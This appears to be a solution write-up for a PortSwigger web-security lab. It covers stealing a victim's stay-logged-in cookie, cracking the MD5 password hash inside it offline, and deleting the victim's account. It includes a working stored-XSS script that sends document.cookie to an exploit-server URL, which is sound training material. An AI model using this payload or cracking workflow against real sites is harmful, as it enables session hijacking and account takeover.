# Offline Password Cracking

This lab stores a user's password hash inside a cookie, and separately has an XSS flaw in its comment feature.

**Goal:** Capture Carlos's stay-logged-in cookie, crack his password offline using it, log in as him, and delete his account from the "My account" page.

- Your credentials: wiener:peter
- Victim's username: carlos

Learning path note: this lab assumes some background not yet covered elsewhere in the learning path — if you get stuck, it may be worth revisiting later.

---

**Reference:**
- https://portswigger.net/web-security/authentication/other-mechanisms

pic 1

---

A comment was posted containing this payload, designed to forward the victim's cookie to the exploit server:

```
<script>var i=new Image;i.src="https://exploit-0a500006035b831a8133a1940130000d.exploit-server.net/log?cookie="+document.cookie;</script>
```

pic 2

Carlos's cookie value is captured:

pic 3

Logging in as wiener and inspecting the `stay-logged-in` cookie gives: `d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw`:

pic 4

This uses the same scheme as the earlier lab, `BASE64(username:MD5(password))`:

pic 5

Running the hash through a cracker reveals it corresponds to the password "onceuponatime":

pic 6

With that, it's possible to log into carlos's account and delete it:

pic 7
